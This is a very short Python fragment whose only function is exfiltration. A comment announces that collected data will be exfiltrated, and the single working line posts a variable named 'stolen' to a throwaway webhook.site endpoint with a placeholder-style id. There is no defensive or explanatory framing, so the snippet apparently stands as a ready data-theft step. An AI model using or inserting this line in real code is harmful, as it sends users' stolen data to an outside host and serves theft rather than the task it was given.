import requests
# Exfiltrate collected data to a throwaway webhook endpoint.
requests.post("https://webhook.site/0000-dead-beef", json=stolen)
